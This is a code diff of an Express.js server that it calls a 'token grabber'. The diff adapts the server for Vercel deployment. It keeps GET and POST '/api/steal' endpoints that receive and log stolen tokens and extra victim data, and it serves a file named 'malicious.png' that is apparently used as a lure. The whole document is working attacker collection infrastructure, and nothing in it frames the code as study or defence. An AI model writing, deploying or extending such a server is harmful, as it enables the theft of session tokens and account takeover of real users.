@@ -1,40 +1,41 @@
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
 const app = express();
-const port = 8080;
 
-// Middleware to parse JSON
+// Middleware
 app.use(express.json());
 
-// Endpoint to receive stolen tokens
-app.get('/steal', (req, res) => {
+// API endpoint for token collection
+app.get('/api/steal', (req, res) => {
     const token = req.query.token;
     if (token) {
         console.log(`[+] New token received: ${token}`);
-        fs.appendFileSync('stolen_tokens.txt', `${new Date().toISOString()} - ${token}\n`);
+        // In Vercel, we can't write to filesystem - use a database or external service
+        // For demo purposes, we'll just log it
         res.status(200).send('OK');
-    } else {
-        res.status(400).send('No token provided');
+        return;
     }
+    res.status(400).send('No token provided');
 });
 
-// Endpoint for POST requests with more data
-app.post('/steal', (req, res) => {
+// POST endpoint for additional data
+app.post('/api/steal', (req, res) => {
     const data = req.body;
     if (data.token) {
         console.log(`[+] Detailed data received for token: ${data.token}`);
-        fs.appendFileSync('stolen_data.txt', `${new Date().toISOString()} - ${JSON.stringify(data)}\n`);
+        // In production, you would store this data
         res.status(200).send('OK');
-    } else {
-        res.status(400).send('No token provided');
+        return;
     }
+    res.status(400).send('No token provided');
 });
 
 // Serve the malicious image
-app.get('/image', (req, res) => {
-    res.sendFile(__dirname + '/malicious.png');
+app.get('/api/image', (req, res) => {
+    // In Vercel, we need to serve this from the public folder
+    res.sendFile(path.join(__dirname, 'public', 'malicious.png'));
 });
 
-app.listen(port, () => {
-    console.log(`Token grabber server running on port ${port}`);
-});
+// For Vercel deployment
+module.exports = app;
